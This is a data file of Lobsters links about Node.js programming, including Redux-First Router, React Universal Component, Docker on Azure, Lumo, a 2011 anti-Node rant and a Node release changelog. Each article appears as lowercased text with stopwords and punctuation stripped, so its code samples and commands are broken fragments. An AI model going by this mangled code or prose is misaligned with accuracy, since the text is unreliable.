268,Lobsters,nodejs,Node.js programming,Server-Render like a Pro /w Redux-First Router in 10 steps,https://medium.com/faceyspacey/server-render-like-a-pro-w-redux-first-router-in-10-steps-b27dd93859de,serverrender like pro w reduxfirst router step,part redirects onbeforechange serverconfigurestorejs serverrenderjs create redirects first place optionsjs idea universal rendering use redux state identical way client maximum code reuse redirects routelevel srcroutesmapjs srcroutesmapjs redirects optimize serverconfigurestorejs fetch appwide data serverconfigurestorejs state serverconfigurestorejs srcoptionsjs actually get user json web token srcselectorsuserfromstatejs jsonwebtoken isallowed functionselector earlier without make additional async request database get perf win traditional user cookie strategy serverconfigurestorejs srcconfigurestorejs word flexible requiring least amount code conclusion reactlandia publication,part point technically done pro yet let handle common thing might wan na redirects onbeforechange serverconfigurestorejs modified detect statelocationkind redirect return falsein serverrenderjs bundled webpack simply shortcircuit receive store serverrenderjswe doesredirect already handled redirect express side resredirect pathnamereceivedfromrfr create redirects first place optionsjs redirect simple action creator built rfrin option provided connectroutes specify onbeforechange handler called every route change signature basically thunknote must use third argument pending action since exist state yet might never redirect isallowed basically redux selector except preemptively pas current location typeif dispatch redirect reduxfirst router middleware shortcircuit action triggered immediately start handling new route case loginwe determine redirect via isallowed function take current type aka route well current state isallowed could anythingwhat focus take entire state argument within state information user determine correct role view current typeroutethe idea universal rendering use redux state identical way client maximum code reuse cover prepopulate store user state redirects routelevel also specify redirects thunk level like srcroutesmapjsnotice detect data received previously empty redirect route different payload category guaranteed always data therefore redirectthere sort reason use redirects route level know use redirect thunk achieve itlastly completeness also want shortcircuit thunk redux already data need srcroutesmapjsthis occur client result user navigating back route already visited perhaps fastpaced app data may changed case want redirects optimize serverconfigurestorejsif using route level global onbeforechange redirects likely want check redirects thunk way unnecessarily wait data address routelevel redirects first redirect caused onbeforechange example detecting user allowedthe second redirect detected result thunk resolvingyour logic may corresponding thunk fact make asynchronous request quickly determines redirect assume reaching stage mean one tick need gone happen fastthe primary difference onbeforechange moved redirect detection logic route unique fetch appwide datasometimes want fetch appwide data would without reduxfirst router serverconfigurestorejsyou await thunk store depending whether appwide thunk depend data received route thunk put promiseall neither dependent triggered state consideration route thunk depends appwide thunk put route thunk afterif appwide thunk depends route thunk put appwide thunk afterif neither dependent wrap em single json web token preloaded stateif using json web token prepopulate store state one obtain user state onbeforechange filter user requestserverconfigurestorejsthen onbeforechange handler get user state using jwtoken convert user object srcoptionsjsif user redirect login routeif user one always case server dispatch action populate store discovered user keep mind happen route action dispatched mean able make use user datahere user reducer look like srcreducersuserjshow actually get user json web token srcselectorsuserfromstatejswe use library jsonwebtoken allows u synchronously transform jwt user objectit must synchronous since happening redux middleware operates synchronously make sure pick library offer syncarbitrary keyval route objectwe bit usual idea isallowed functionselector earlier advanced one verifies jwt check role attached route routesmap put arbitrary keyval route later filteringthe filtering function isallowed userfromstate would selector directory also double straightforward selector client simply want retrieve user state simultaneously determining user access given routeso get user either server clientget required role current routeif role return user whose truthy value indicate user permission view routeif user return nullif role route return user user roleif familiar json web token idea store small amount data cryptographically token ie long hash string decoded essential data user server without make additional async request database get perf win facilitate essentially storing user info secretly browser ability transform user object server via secret key strategy without ssr store jwt localstorage instead cookie pas jwt ajax request header cooky required ssr unlike ajax request set header user visit site directly short localstorage spa dead cooky universal apps want google traffic bring full circle idea iscreatestore rootreducer preloadedstate enhancer start jwt via preloadedstateand end w user object route thunk chance resolve allowing determine fetch state triggeror user redirected login route traditional user cookie strategyyou also traditional user cookie strategy use cookie fetch complete user object databaseperformance wise good mean request database needed every authenticated routeserverconfigurestorejswhat seeing thing using nonrfr thunk fetchuser get user info store redux state based sessionid cookiewe delaying initial dispatch potentially user state proper filtering global route level occurthe rest seen beforefinally make actually work must consider rfr default automatically dispatch initial action call connectroutes option delay manually returned initialdispatch function well srcconfigurestorejsas see covered great number circumstance little magic however helper make idiom obvious word flexible requiring least amount codenote strategy perfected working eudaimos use case initialdispatch actually first originated saga use case able trigger first route saga started something karky pointed outconclusionby thing redux first router way encapsulate need redux client server aka universal really quite powerful mechanism mean virtually server code outside reduxreact code already using clientthe number way thing right becoming le le day day make code readable mean le decision makein future cover complete user authentication filtering subscribe reactlandia publication medium stay tunedif first time encountering reduxfirst router make sure review star repo
269,Lobsters,nodejs,Node.js programming,Redux-First Router - Interview with James Gillmore (@faceyspacey),https://survivejs.com/blog/redux-first-router-interview/,reduxfirst router interview james gillmore faceyspacey,history api james gillmore reduxfirst router faceyspacey technology one initial user reduxfirst router solving usecase middleware article old approach many setter action new approach fewer action smarter fatter reducer code cracked ssr splitting article react universal component launch article universal dawson nchanged fusebox reduxfirst router universal repository,routing one classic topic come history api quite simple different opinion apply idea routing web application site james gillmore decided tackle problem particularly react redux reduxfirst router tried stay quiet keep code rather perhaps good time say word story started year ago hiring developer build thing worked music studio time square nyc hired developer build website client eventually even got myspace spamming thing lot audio engineering soon realized talent best directly applied technology dream becoming famous beatmaker never came true jumped ship started boutique web development agency faceyspacey technology got trouble completing product time client became coder matter necessity rest history long history selfmastery programming real world reduxfirst router something existed long ago react community time caught throwing much ancient wisdom skipped reduxfirst router completes triumvirate mvc modelviewcontroller adding c equation redux react v nobody wanted hear letter mvc anathema also kill everything component concept come route reduxfirst router follows philosophy everything state route sync action trigger state component make view layer render state reduxfirst router action dispatched result visiting url conversely address bar updated response matching action significant special something never done action dispatched unique type given kind url unique previous attempt redux routing reduxlittlerouter dispatch action type equivalent locationchanged dig lot information nested action figure happened nt conducive switching type idiomatic reducer obvious sound type informative action manually dispatch key ingredient finally make routing seamless redux apps initial attempt redux routing followed react router approach everything component one initial user put cargo culting react router stuff everyone else nt feel right felt leaky felt hacky fact matter keeping state especially url state view layer antipattern long time yet somehow react convinced u exception make sense nt redux another data store lot compelling opportunity unveil reduxfirst router avoids using misplaced route component react router similar package package promoted version route rather take advantage redux remove state view layer route developer redux still reach contrary easy seasoned developer may feel redux difficult novice even intermediate developer think route still make sense broad category user power user reduxfirst router kill route component well statewithintheviewlayer antipattern everything reduxfirst router mirror terminology thinking redux primary example thunk option attached route api used reduxthunk ie dispatch getstate argument also reduxfirst router stand fact start encouraged get redux meaningful thing philosophy useful way contract dan abramov enforced u made life easier quick list unique powerful thing reduxfirst router routetriggered datafetching prefetching chunk data react native support android backhandler deep linking push notification sick stuff make react navigation actually work redux best stuff hearing soon top notch serverside rendering idiom everything expect redirects scroll restoration component automatic documenttitle management pageleave confirmation dynamic route adding codesplitting history entry state list go attempt reduxspecific routing pretty bare bone never got around polishing enough make fullfeatured solution always feature need added reduxfirst router something committed community expense spared nt told anyone survivejs first hear relative newcomer react december decided skip straight react native could skip mastering webpack related choice client project build deadline jumped right built using redux near end app add deep linking push notification wanted find way make app urldriven without changing much code began looking redux routing solution rn since nt trick decided check plain web realized nt anything anywhere allowed build redux app urlindependent way yet still support url point occurred obvious solution make regular flux standard action somehow representative url whole action type path concept born built router change almost code since action flux standard action payload object matter setting routing config change reducer complicated surprised nobody taken route yet well point fewer action using reduxfirst router fewer action good given number action get control instead one setterstyle action show drawer another setterstyle action close eg opendrawer closedrawer simply feed notification need anyway reducer must add tear code open close drawer visit route instance visit notification draweropen state true visit feed draweropen false example taken reduxfirst router solving usecase middleware article old approach many setter action const sidebaropen state false action switch actiontype case sidebarclosed return false case sidebaropen return true default return state export default sidebaropen new approach fewer action smarter fatter reducer const sidebaropen state false action switch actiontype case home case list case video case login return false case setting return true default return state export default sidebaropen change reducer remove unnecessary action dispatched make reducer respond intelligently wider variety action voilà record time url could deep link app working completing universal product line exciting connection reduxfirst router hint word prefetching overall main priority building nextjs rest u put another way frameworkless approach best feature nextjs nextjs great power user want get locked walled garden time done initial vision reason use nextjs webpack configuration either much something would rather deal truly professional apps ca nt see seasoned developer would want way aiming top spot given market want complete customization available simultaneous serverside rendering ssr code splitting become significant gritty timeconsuming problem nobody wanted solve view single page application dead simultaneously ssring splitting wrong traffic google biggest driver many business key component basically anything online go without ssr mistake given tool using heavy regarding byte also mistake split code need done together way splitting nt increase bounce rate also compound google problem since google like fast site ssr code splitting hairpulling experience people gave wo nt get nitty gritty challenge today read code cracked ssr splitting article recent react universal component launch article learn oh way ssr reduxfirst router idiomatic redux ever server due way universal product line work regardless router use simultaneous ssr code splitting dream reduxfirst router still stuff left heard splitting nt related routing misled highest level need prefetching connection router splitting simple interface specify route prefetch reduxfirst router first solution nextjs link prefetch reduxfirst router something far powerful automatic prefetching based current state current page user recorded redux state onetime setup working potential next route prefetched one final thing know reduxfirst router prefetching work chunk prefetched data route thunk well question intention anything waste time wrong thing intention likely shift evolve paradox take long time reach sort maturity intention become better started game developer entrepreneur wanting build empire reality long since kicked as forced become coder dig hole say long long history mastering craft timeconsuming passion like think straightshooter cowboy type clarity vision sure passion software natural enthusiasm creation conception general truth enjoy thing outside staring screen far craftsman matter maturity integrity pay bill create value make real stuff exists mind innately compelled built open source stuff built primarily refused go another project without box checked also nt focus open source make sure intention truly pure make sense juncture happen thing plan create time luxury go long firstprincipled route happens align open source contribution getting creation front people anything else get real world easy waste life way front computer miss everything thought time willynilly open source project open source make count financially one way another better place give interact outside digital realm programming business tool mean end shame business nt hide behind technology whether phone immersing work learn people follow truly excites intention build empire change world sincerely ask question really thing building someone else build matter time world nt need change going go lot unnecessary pain trying say natural important thing forcing anything lead bad result human forcing often core aspect journey getting somewhere longer force thing advice new programmer skip college lol get jam lol complete product force become better programmer option perceive know thing two conviction build something unique insight build interview someone leading serverless charge come react another trend explode soon puzzle piece come together perhaps dawson guy nt tried yet love see serverless made stupid simple react crowd seem path someone else interview nchanged fusebox perhaps addiction debunking stale solution even though get tremendous amount value webpack love see built ground everything made lot simpler still flexible know alone feeling fusebox seems show promise able perhaps easier said done webpack also getting easier day may unnecessary ever felt redux deserved routing solution native workflow give reduxfirst router try thanks interview james reduxfirst router seems like great addition ecosystem chronological history james product line progressing thus far reduxfirst router universal repository like give reduxfirst router try right
270,Lobsters,nodejs,Node.js programming,Announcing: React Universal Component 2.0 & babel-plugin-universal-import,https://medium.com/faceyspacey/announcing-react-universal-component-2-0-babel-plugin-universal-import-5702d59ec1f4,announcing react universal component babelpluginuniversalimport,react universal component babelpluginuniversalimport people say universal true universal rendering code splitting reduxfirst router codesandbox variable dynamic expression true universal component must webpack support weak resolve w dynamic expression pr file becomes entry point additional chunk tobias koppers pr comment tobias koppers webpack freelancing logboo use today reactuniversalcomponent way helped someone reactasynccomponent cntrlplusb babel introducing babelpluginuniversalimport pr webpack babelpluginuniversalcomponent addition preval phase babelpluginpreval significance frictionlessness ladder abstraction wallabyjs observability pre crux offering really webpackflushchunks package provides thing get anywhere else many package reactlandia chat kent c dodds dan abramov gajus kuizinas wait thing become even easier even though mission conclusion frameworkless approach epilog many thanks community pr one reactuniversalcomponent go next excited latest evolution universal rendering tweet heart star developer know idiomatic javascript reactlandia read,react universal component babelpluginuniversalimportwhatup reactlandia today want introduce something powerful aboveclick like click share tweet thanks readingwhat people say universal true universal rendering code splittingif checked universalcomponent used reduxfirst router codesandboxto spa crowd able use variable within dynamic import anything new aka dynamic expression even though general component allows u pas name module import prop significant either able dynamically importrequire part true universal componenttrue universal rendering impossible simple fact webpack supported ithere true universal component must call import client user navigation new pagescomponentscall requireresolveweak webpackspecific method server render synchronouslycall requireresolveweak client initial load also render synchronously ie without triggering additional request server without checksum mismatch insure additional dependency put parent bundle synchronous requires defeat point codesplitting existing loadable component required create many universal component support one static import time could import foo able use dynamic expression synchronously module delivered given environment without creating new dependenciesto render universal component synchronously requires calling requireresolveweak foo requireresolveweak page latter supported webpack nowwebpack support weak resolve w dynamic expressionslast week finalized pr add feature webpack feature revolves around context context capability unique webpack enables extend import requires work context bundling codesplitting different use word context create dynamic import import asynccomponents page creates representation possible module import asynccomponents folder context notably used triggering creation every possible bundlechunk could come folder file becomes entry point additional chunk also support nested directory lot chunk possible unlike import requireresolveweak missing feature lesserused feature pursuit universal codesplitting necessitated itby way called weak way webpack work mark importedrequiredresolved module weak dependency mean parent module importedrequiredresolved expect module included chunk expects somehow manually made available fact primary purpose resolveweak see module require unavailable module throw error resolveweak unlike import require give moduleid use key hash module available see available actually requiring itwhen finally require use webpack internal function requiring also insure new dependency created webpackrequire moduleid think webpack really method called requireweak something tune fact webpack compiler transforms resolveweak special way creates context talked static initial part module pathbut theoretically could added webpack today many reading wondering resolve meansthe bottom line featurecomplete way keep module parent chunk desire requiring modulesso without due conclusion resolveweak pr story within day tobias koppers sokra merged pr expecting least week two guess wanted badly thing added fact example create weak context via requirecontext well use magic comment weakly import ie like import webpackmode weak foo read pr comment hear tobias koppers week webpack freelancing logbook learn exactly added doeshowever published npm yet catchhere use todayupdate august pr published longer use normal webpackdon let following installation detour thing become badass developer stop anything yarn add dev webpackuniversal modulealias add package modulealiases webpack nodemoduleswebpackuniversal paste top serverside entry script require modulealiasregister yea use fork next webpack release seems like every week half try super awesome brand new demo reactuniversalcomponent repo belowhere see demoeverything documented corresponding universal repos approaching future already using reactuniversalcomponent break existing usage existing usage even rely dynamic go next way beforewhen thing become frictionless platform evolve yesterday helped someone also awesome codesplitting package reactasynccomponent cntrlplusb issue without dynamic import create hash split point component guarded function needed pick one hash callthe following example problem context reactuniversalcomponent support synchronous rendering via resolve option unfortunately reactasynccomponent hashbased dynamic import u dont anymore resolve option eitherto seasoned codesplitting expert par course however hashbased solution key gotcha stagnated potential codesplitting long time nowand make matter worse soon could became clear also part universal synchronous rendering mechanism requireresolveweak ie pr solves precise issue person reactasynccomponent stackoverflow github littered people quandarybut still equation notice resolve option small still hitting mark developer smart wonder thing stress cognitive overhead averted anything import leaf thing inaccessible territorynote babel server way provide yet another option path pathjoin dirname foo come flushing module server webpackflushchunks package even work requiredto make thing completely accessible frictionless requires creating babel plugin eliminate additional option unfortunately older solution option universally renderintroducing babelpluginuniversalimporti initially began really caring whether babel plugin saved line babelplugindualimport mean already babel plugin play building support universal component utilize dynamic expression dynamic resolveweak pr webpack facilitate finally occurred universal prop import propspage frictionless glory would finally make universal codesplitting accessible doneso without due introduce babelpluginuniversalcomponent combination babelplugindualimport elimination extra option obviously generates based argument import however importantly automatically generates name chunk magic comment magical disappearedif familiar babelplugindualimport plugin released several week ago webpack import soon fetch j cs today articlethe short webpack master plan cs includes import retrieving two file j chunk stylesheet chunk better cacheability importantly keep amount cs serve minimum way j chunk serve needi go depth since cs play central role completing vision digress sec basically approach give latest cssinjs solution run money one exception emotion track generate static stylesheets via extract mode mean would play nice together though recommend using since yet support solve requires solution come problem completely different angle strategy become common place emotion team good position join fray true universal rendering look forward happening think certainly cssinjs package simply came problem time generating multiple stylesheets per call import impossibility suggestion look extractcsschunkswebpackplugin another package universal family generates multiple stylesheet chunk cssinjs solution currently suffer sending javascript description style addition critical render path cs even though pitch serving minimal amount cs may send minimal cs send amount stylerelated byte total stylesheets cached render function work server client however minimal emotion potential game changer also love glamorous would love see take universal codesplitting approach cs done combination highest level requires making dynamic cssinjs static preval phase cs except cs dependent prop kent dodd babelpluginpreval keythe significance frictionlessnessthese incremental evolution may seem small understand must familiar startup application development wisdom significance frictionlessness take many form let take simplest concrete example product level game uber make ordering taxi pressing buttoninstagram make sharing photo pressing buttontwitter make worldwide connectedness typing character pressing button xyz ondemand startup fulfills demand pressing buttonthe metaphor also applied advanced system algorithm favorite lesser known bret victor piece ladder abstraction bret describes certain algorithm become fast enough frictionless open door next evolution systemjust imagine debugger debugging code line line well imagine debugs code evaluated different input variable simultaneously similar wallabyjs continuous test runner fact provides visual tool jump different way code executed contextrelevant way instead debugging line linewell really computer fast enough system aka computer evolve fast enough many opportunity explore code aka observability open upobservability code one bret core tenet described one main article google first time hearing regret itwhen thing become cheap timeconsuming thing nearinfinite number time focus next level game whatever isfor reactlandia lot todo list universal rendering rest assured hearing finally frictionless open door componentlevel datafetching rehydration serverfetching rehydration along side codesplittingprefetching chunk import said dataput another way something previously hard supreme ease result people finding new way apply evolve medium look forward next reactlandia universal code splitting becomes commonplace developer innovating finding solution problem even know word evolving react platformlastly drive home challenging attempted read quote react router doc code splitting godspeed attempt serverrendered codesplit apps ssr splitting godspeedwhile aspect must handled server certainly challenging part every bit efficiency squeeze anywhere key strategy reaching inflection point mass adoption becomes realitynote today talking component aspect however crux universal offering really webpackflushchunks package provides thing get anywhere else webpackflushchunks essentially glue universal family brings everything together insure client precise chunk need synchronously render initial load le oneofa kind package struggled simultaneous ssr splitting must check outlook forward next big release consolidates package clue renamed universalrender many packagestransparency deploy early often learn reason grown several product offline become personal mission mine give fear perception get thing people hand sooner constantly improving processi found pay long run lead building right thing common startup wisdom already many merged pr universal community direction changed based learnedthat said realize confusing many related tool floating around expect everything consolidate become easieri must say given additional confusion far exceeded expectation many people tool resonated quickly especially newcomer open source inspiring hearing many developer ecstatic problem finally solvedonce thing consolidate expect thing take let hold back trying thing chose take time focus open source want go another project without tool ie actual need opinion base requirement b exciting communityoriented iteration great interacting make sure come say hi reactlandia chatdevelopment timeconsuming take thing completion real test character work silo fuel money lucky long time honestly loving feedback cycle provided bare financial need met fuel inspiration run far deeper super helpful communityfocused developer like kent c dodds dan abramov gajus kuizinas name taught u thisso consolidating space simplifying thing relies try tool star repository developer know value perhaps even contribute wait thing become even easier even though mission helping grow popularity package brings u today conclusion conclusion frameworkless approachthe frameworkless approach relies savvy package adoption biggest draw javascript ecosystem despite many people complain language language could suck longer true mattertherefore important skill right ability review package try swiftly coding benefit greatly skill able know package true gamer changer mature make sense adopt course learn ton analyzing source codethe reason want frameworkless approach give u flexibility apps grow difference nextjs without framework negligible time done nonexistent well fact way around say tool achieve aimed level simplicity inevitably explode popularity developer skill level like pyramid least amount developer skill top framework quickly become popular larger developer audiencethe downside though seen meteor seeing nextjs soon key feature commoditized outside walledgardens soon longer thing best way easily far flexibilityof course speaking bit preemptively developer paying attention sense go coming week bring answer power user want best nextjs minus walled garden answer comer informed enough desire frameworkless approach perhaps without tool would mistake take project deadlineas today ssr splitting finally reach general consumption hope give universal try share experience tell love javascript long live frameworkless development reactlandia faceyspaceyepilognew feature react universal component onbefore onafter onerror callback prop especially important universalcomponent switch multiple component allow display loading indicator elsewhere ui placeholder imported componentno need provide resolve path chunk option babelpluginuniversalimport generates themstylesheet chunk automatic importing along j dual import via babelpluginuniversalimportnew option alwaysdelay loadingtransition see doc infostatic hoisting mycomponentdosomething becomes universalcomponentdosomething doc overhaul package universal familyplenty bug fix enhancement webpackflushchunks extractcsschunkswebpackplugin babelpluginuniversalimport reactuniversalcomponent many thanks community pr oh clear need one universal component show imported component rendered synchronously server synchronously client first load asynchronously navigationyou find demo reactuniversalcomponent repo make sure try itwhere go next excited latest evolution universal rendering tweet heart star developer know idiomatic javascript reactlandia read find twitter faceyspaceywant stay current reactlandia tapclick follow next faceyspacey publication receive weekly medium letter via email
272,Lobsters,nodejs,Node.js programming,"Node, Docker and the Theory of Relativity",https://medium.com/burke-knows-words/node-docker-and-the-theory-of-relativity-4d39b742db63,node docker theory relativity,node docker theory relativity free one docker thing idea put node docker buzzword shayne boyer follow doc create express app expressreactstarter create configure dockerfile create app directory install deps set port build test run port docker restricted port push docker hub azure container registry deploy azure container instance catch docker crazy cool thing nodejs azure video,node docker theory relativitythis article refers demonstrates azure container instance azure account get free one enjoy free azure housei always felt docker like theory relativity everyone talk like understand nobody idea actually isused creative common captioned truly guy name probably steve would crazy chance well still know exactly docker know least make smarter stevewhat docker thingsfor catching docker bundle code dependency inside container deployed server work know work container matter dealing entire operating system variable version configuration ect like deploying executable except maybe deploying entire web server run machine run deploy ithow work ideadocker seems like defying law physic much like theory relativity hey judge start sentence word trying say light always travel speed relative current speed time slows faster go guess stretch accept docker work however work okput node docker buzzwordlet look deploy node express application docker container even put web everyone everyone bask blinding light genius mr shayne boyer get huge chunk credit post guided land darkness tearsthe easiest way follow doc walk creating express app cloned github adding docker filehere brief feel like seen create express appfor example going using expressreactstarter project perfect scaffolding reactexpress project also wrote selfesteem fragilemake sure build asset build folder folder containerize using expressreactstarter would run npm run create dockerfileif using expressreactstarter already said best thing ever create new file called dockerfile extension new trend file extension like prince madonna last configure dockerfileit look something like go much detail going watch let talk app directory anything want know people usersrcapp seems standard configuration internet must rightinstall deps notice copying packagejson first npm install copying build directory case server folder set port development express run port production look port build docker build yournameimagename test outin production app run port however run port docker restricted port information could used hour ago pain gain test map different port work fine visit browser docker run p yournameimagenamenote press ctrlc twice exit running docker containerme embarrassingly long amount push itnow need push image docker hub azure container registry docker hub great thing public although private well azure container registry private repository use whichever one want going tell live deploy itnow deploy thing web use azure container instance deploy one command worry anything else much drama life ask steve login azureaz login create resource groupaz group create n yourgroupname create containeraz container create n yourappname g yourgroupname image yourimagename ipaddress publicazure create new container instance check status executing az container list move succeeded ready gosince requested public ip immediately hit siteand done herewhat catch would like go record saying docker sound good true want know catch fine print tell actually work like kid saw commercial toy airplane showed flying actually buy find one make flyall say docker crazy one think greatest thing ever last know high school againif liked make sure check cool thing nodejs azure possibility endless actually finite number permutation metaphorps would like actually understand theory relativity impress friend impressed check video
273,Lobsters,nodejs,Node.js programming,npm package is stealing env variables on install,https://twitter.com/o_cee/status/892306836199800836,npm package stealing env variable install,,detected javascript disabled browser would like proceed legacy twitter yes
274,Lobsters,nodejs,Node.js programming,Lumo: ClojureScript on Node.js without JVM,https://github.com/anmonteiro/lumo,lumo clojurescript nodejs without jvm,lumo compile clojurescript project entirely without jvm experimental javascript version google closure compiler announcement blog post pledge build status content installation permission failure note manual latest release using lumo interactive clojurescript repl announcement blog post compile clojurescript blog post port quick start compiler option building boot yarn nodejs contributing contributingmd backer become backer sponsor become sponsor copyright license license,lumo lumo standalone clojurescript environment run nodejs javascript engine start instantaneously provides outofthebox access entire nodejs ecosystem including clojurescript repl lumo also provides clojurescript build api making possible compile clojurescript project entirely without jvm thanks experimental javascript version google closure compiler read announcement blog post pledge enjoy lumo consider backing sponsoring project build status platform status macos linux window content installation npx package runner come try lumo without install npm install g lumocljs get permission failure try npm install g lumocljs unsafeperm note installed binary named lumo rather lumocljs note want install binary built master run brew install head lumo responsibility docker pull anmonteirolumo latest docker run anmonteirolumo manual download latest release move somewhere path using lumo interactive clojurescript repl enter lumo command line launch clojurescript repl npm init npm install express request requestpromise lumo lumo clojurescript cljsuser require express cljsuser require requestpromise rp cljsuser def port cljsuserport cljsuser express get fn req re send re hello lumo listen port object server object object cljsuser str http localhost port rp fn body println nreceived body catch fn err println noops stack err object promise object promise received hello lumo check lumo h usage instruction supported command line option also see announcement blog post compile clojurescript lumo compile clojurescript code version see introductory blog post still considered experimental given relatively new google closure compiler port javascript aim feature parity jvm clojurescript compiler build api mirror clojurescript one please reference quick start compiler option basically replace namespace lumobuildapi require lumobuildapi lumobuildapibuild src outputto outmainjs following example also show use multiple source folder require lumobuildapi b bbuild binputs variadic outputto outmainjs building build lumo source make sure installed boot yarn nodejs version root repository run boot release resulting binary found buildlumo buildlumoexe window contributing see contributingmd backer support u monthly donation help u continue activity become backer sponsor become sponsor get logo readme github link site become sponsor copyright license copyright antónio nuno monteiro distributed eclipse public license see license
275,Lobsters,nodejs,Node.js programming,Node.js is Cancer (2011),http://widgetsandshit.com/teddziuba/2011/10/node-js-is-cancer.html,nodejs cancer,shit work butthurt post scalability disaster waiting happen put toothpaste block node punishes developer disobeys unix way fucking tl dr,one thing web developer love knowing better conventional wisdom conventional wisdom conventional reason shit work something bothering nodejs nonsense never took time figure read butthurt post ryan dahl node creator going shrug another jackass whine unix hard like police officer sens something nt quite right family minivan pulled discovers fifty kilo black horse heroin back thought something nt quite right guy awshucks sob story maybe maybe idea writing code unchecked year since reading probably know hunch turned nodejs tumor programming community completely braindead people use go infect people ca nt think eventually every asshole run want tell gospel event loop accepted epoll heart scalability disaster waiting happen let start horrifying lie nodejs scalable never block radiation good put toothpaste node home page say almost function node directly performs io process never block nothing block lessthanexpert programmer able develop fast system statement enticing encouraging completely fucking wrong let start definition reddit knowitalls keep specific pedantry function call said block current thread execution flow wait function finished continuing typically think io blocking example calling socketread program wait call finish continuing need something return value fun fact every function call cpu work also block function calculates nth fibonacci number block current thread execution using cpu function fibonacci n n return else return fibonacci fibonacci yes know closed form solution nt front mirror somewhere figuring introduce let see happens nodejs program little gem request handler httpcreateserver function req re reswritehead contenttype textplain resend fibonacci listen older laptop result ted lorenz time curl http real user sys second response time cool know javascript nt terribly fast language indictment node evented model brain damaged fanboys make think everything ok really abusive pseudocode event loop work readyfiledescriptor eventlibrary poll handlerequest readyfiledescriptor well good know apply server problem pluralized shit loop running thread handlerequest programmer pulse notice request handler hold event loop matter asynchronous library given let see little node server behaves modest load request concurrent ted lorenz ab n c http request per second sec mean query per second diesel sure node allows fork child process point threadingevent model tightly coupled got bigger problem scalability considering node original selling point god damned terrified fast system lessthanexpert programmer bring world node punishes developer disobeys unix way long time ago original neckbeards decided good idea chain together small program performed specific task universal interface text develop unix platform abide principle operating system reward simplicity prosperity example web application first began web application program printed text standard output web server responsible taking incoming request executing program returning result requester called cgi good way business microoptimizers sank grubby meathooks conceptually web application architecture cancer still work today web server program job accept incoming request parse figure appropriate action take either serving static file running cgi script proxying connection somewhere else whatever point http server nt entity application work developer around block call separation responsibility exists reason loosely coupled architecture easy maintain yet node seems oblivious node nt laugh making shit http server supposed use serve production traffic yeah example called httpcreateserver preferred setup search around nodejs deployment find bunch people putting nginx front node people use thing called fugue another javascript http server fork bunch process handle incoming request somebody maybe thought nonblocking snake oil might issue cpubound performance using node probability developer system administrator system administrator would talked using node first place developer must face punishment setting http proxying orgy want put real web server front node thing like serving static query rewriting rate limiting load balancing ssl futuristic thing modern http server another layer health check system need although let honest node developer probably serving application directly node running screen session account fucking javascript probably worst thing serverside framework written javascript typeof myvar undefined myvar null idiot put rasmus lerdorf shame nt even tl dr nodejs unpleasant software library use
276,Lobsters,nodejs,Node.js programming,Node v8.2.0,https://nodejs.org/en/blog/release/v8.2.0/,node,async hook build cluster dns npm napi asynchooks net asynchooks asynchooks asynchooks asynchooks asynchooks asynchooks asynchooks asynchooks asynchooks asynchooks semverminor asynchooks asynchooks semverminor asynchooks asyncwrap asyncwrap benchmark benchmark benchmark lib test buffer semverminor buffer semverminor buffer build semverminor build build build build build build build build win build win build win build window build window childprocess childprocess childprocess semverminor cluster cluster console semverminor deps semverminor deps deps deps semverminor dns semverminor dns doc doc doc semverminor doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc doc util console doc test error error f gyp http http http semverminor http inspector inspector test lib lib lib lib lib napi napi napi napi napi napi napi napi napi napi semverminor net semverminor net process querystring readline repl src src src src src src src src src src src src src src src src src src semverminor src src src src src src src f src lib test doc stream stream test test test test test test test test test test test test test test test test test test test semverminor test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test test asynchooks test asynchooks test asynchooks test f semverminor tl tool tool tool tool tool tool tool tool tool tool tool tool tool tool tool tool tool tool tool tool tool benchmark url url util util util http http http http http http http http http http http http http http http http http http http http,big thanks addaleax prepared vast majority release async hook multiple improvement promise support asynchooks made build compiler version requirement build node gcc raised gcc cluster user finegrained control inspector port used individual cluster worker previously cluster worker restricted incrementing master debug port dns npm npm cli updated version particular come npx binary also shipped node npm changelogs napi reuse objecttemplate instance gabriel schulhof asynchooks net ensure asyncidnull handle matt sergeant asynchooks make asyncresource match emitinit andreas madsen asynchooks rename internal emit function andreas madsen asynchooks fix nested hook mutation andreas madsen asynchooks move restoretmphooks call init ruben bridgewater asynchooks c embedder api overhaul andreas madsen asynchooks require parameter emitbefore andreas madsen asynchooks use common emitbefore emitafter andreas madsen asynchooks fix default nexttick triggerasyncid andreas madsen asynchooks reduce duplication factory ruben bridgewater asynchooks proper id stacking promise anna henningsen semverminor asynchooks rename currentid triggerid andreas madsen revert asynchooks set hook used trevor norris semverminor asynchooks use resource object promise anna henningsen asyncwrap use ktotals enable promisehook trevor norris asyncwrap expose enabledisablepromisehook api anna henningsen benchmark fix typo inspectproxy vse mozhet byt benchmark improve event performance test benedikt meurer benchmark lib test use brace multiline block rich trott buffer remove maxsafeinteger check length rich trott semverminor buffer support boxed string toprimitive james snell semverminor buffer add constant object anna henningsen build prevent vsdevcmdbat changing cwd nikolai vavilov semverminor build add npx installers kat build run testhashseed end michaã l zasso build allow enabling tracemaps flag evan lucas build split cpplint avoid long cmd line kyle farnung build add asynchooks testing vcbuildbat refael ackermann build remove dependency icu io library ben noordhuis build clean configfipsgypi daniel bevenius build win skip vcvarsallbat env set refael ackermann build win respect v version building addons real build win use latest installed v default real build window restore disttypedir refael ackermann build window implement python detection refael ackermann childprocess refactor normalizespawnarguments rich trott childprocess fix handleless nodehandle handling santiago gimeno childprocess emit ipc message next tick cjihrig semverminor cluster overriding inspector port cornholio cluster remove obsolete todo ruben bridgewater console use plain object error stack ruben bridgewater semverminor deps hotfix bump npx version kat semverminor deps upgrade npm kat deps upgrade libuv cjihrig deps delete depsicusmallsourceio ben noordhuis semverminor dns add resolveany support xadillax semverminor dns make dnssetservers support customized port xadillax doc fix inspectport documentation clustermd anna henningsen doc add guidance testing new error michael dawson doc move lts readme link increase prominence gibson fahnestock semverminor doc fix clustermd cornholio doc update umask clarity james sumner doc add notice useglobal option repl doc starkwang doc prefix stacktrace errorsmd roman shoryn doc add missing space timothy gu doc removed redundant mention error code jklepatch doc correct stream duplex allowhalfopen doc rich trott doc note resize event condition window dean coakley doc fix mistake httpmd moogen tian doc match debugger output instruction master behavior jan krems doc add documentation icu timothy gu doc fix padding mode cryptopublicdecrypt moonball doc add ctc member collaborator list rich trott doc fix example childprocessmd ruslan iusupov doc add default value function fsmd matej doc fix broken reference alexander gromnitsky doc move modulespecific globals modulesmd tobias doc fix indentation issue sample 